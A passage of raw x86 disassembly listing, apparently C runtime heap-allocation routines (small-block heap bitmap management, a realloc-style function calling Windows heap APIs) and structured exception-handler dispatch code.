  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
